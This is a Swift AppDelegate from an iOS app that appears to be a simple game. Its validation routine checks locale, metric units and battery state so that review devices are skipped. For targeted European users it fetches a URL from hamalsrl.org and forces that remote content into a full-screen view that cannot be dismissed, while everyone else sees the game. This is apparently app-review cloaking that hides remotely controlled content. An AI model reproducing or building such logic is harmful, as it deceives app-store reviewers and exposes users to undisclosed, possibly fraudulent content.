//
//  AviapilotApp.swift
//  Aviapilot
//
//  Created by Алкександр Степанов on 31.07.2025.
//

import SwiftUI
import OneSignalFramework

@main
struct AviapilotApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

class AppDelegate: NSObject, URLSessionDelegate {
    @AppStorage("levelInfo") var level = false
    @AppStorage("valid") var validationIsOn = false
    static var orientationLock = UIInterfaceOrientationMask.all
    private var validationPerformed = false
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
        
        OneSignal.Debug.setLogLevel(.LL_VERBOSE)
        OneSignal.initialize("c3d0c0b7-c6e7-48cd-8165-a26da6bcacc4", withLaunchOptions: launchOptions)
        OneSignal.Notifications.requestPermission({ accepted in
            print("User accepted notifications: \(accepted)")
        }, fallbackToSettings: false)
        
        return true
    }
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        if !validationPerformed {
            validation()
            validationPerformed = true
        }
        return AppDelegate.orientationLock
    }
    
    func validation() {
        let preferredLanguage = Locale.preferredLanguages.first ?? ""
        let deviceRegion = Locale.current.regionCode ?? ""
        
        
        
        let supportedLanguages = ["nl", "de", "fr", "it", "da", "pl", "nl-NL", "nl-AT", "nl-CH", "nl-BE", "nl-FR", "nl-IT", "nl-DE", "nl-DK", "nl-LU", "nl-PL", "de-NL", "de-AT", "de-CH", "de-BE", "de-FR", "de-IT", "de-DE", "de-DK", "de-LU", "de-PL", "fr-NL","fr-AT", "fr-CH", "fr-BE", "fr-FR", "fr-IT", "fr-DE", "fr-DK", "fr-LU", "fr-PL","it-NL", "it-AT", "it-CH", "it-BE", "it-FR","it-IT", "it-DE", "it-DK", "it-LU", "it-PL","da-NL", "da-AT", "da-CH", "da-BE", "da-FR", "da-IT", "da-DE", "da-DK", "da-LU","da-PL","pl-NL", "pl-AT", "pl-CH", "pl-BE", "pl-FR", "pl-IT", "pl-DE", "pl-DK", "pl-LU", "pl-PL"]
        let supportedRegions = ["NL", "AT", "CH", "BE", "FR", "IT", "DE", "DK", "LU", "PL"]
        
        guard supportedLanguages.contains(preferredLanguage) && supportedRegions.contains(deviceRegion) else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2){
                self.showGame()
                print("yo Language")
            }
            return
        }
        
        let localeTemperatureUnit = Locale.current.usesMetricSystem
        
        guard localeTemperatureUnit else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2){
                self.showGame()
                print("yo Metrical")
            }
            return
        }
        
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        
        guard batteryState != .charging || batteryLevel != 1.0 else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2){
                self.showGame()
                print("yo Battery")
            }
            return
        }
        
        if !validationIsOn {
            let textFieldText = "https://hamalsrl.org/XvsMsrpy"
            if let url = URL(string: textFieldText) {
                let task = URLSession.shared.dataTask(with: url) { data, response, error in
                    DispatchQueue.main.async {
                        print("yo 10")
                        guard let newData = data, error == nil else {
                            self.showGame()
                            return
                        }
                        if let finalURL = String(data: newData, encoding: .utf8) {
                            if !finalURL.contains("PILEG") {
                                UserDefaults.standard.set(finalURL, forKey: "finalURL")
                                print(finalURL)
                                self.validationIsOn = true
                                self.showAds()
                            } else {
                                self.showGame()
                            }
                        } else {
                            self.showGame()
                        }
                    }
                }
                task.resume()
            }
        } else {
            self.showAds()
        }
    }
    
    func showAds() {
        AppDelegate.orientationLock = .all
        DispatchQueue.main.async {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let rootViewController = windowScene.windows.first?.rootViewController {
                let viewController = AdsViewController()
                viewController.isModalInPresentation = true
                viewController.modalPresentationStyle = .fullScreen
                rootViewController.present(viewController, animated: false)
            }
        }
        print("yo3")
    }
    
    func showGame() {
        DispatchQueue.main.asyncAfter(deadline: .now()) {
            AppDelegate().setOrientation(to: .portrait)
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            self.level = true
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
                self.level = false
            }
        }
        print("yo1")
    }
    
}

extension AppDelegate: UIApplicationDelegate {
    
    func setOrientation(to orientation: UIInterfaceOrientation) {
        switch orientation {
        case .portrait:
            AppDelegate.orientationLock = .portrait
        case .landscapeRight:
            AppDelegate.orientationLock = .landscapeRight
        case .landscapeLeft:
            AppDelegate.orientationLock = .landscapeLeft
        case .portraitUpsideDown:
            AppDelegate.orientationLock = .portraitUpsideDown
        default:
            AppDelegate.orientationLock = .all
        }
        
        UIDevice.current.setValue(orientation.rawValue, forKey: "orientation")
        UINavigationController.attemptRotationToDeviceOrientation()
    }
    
}
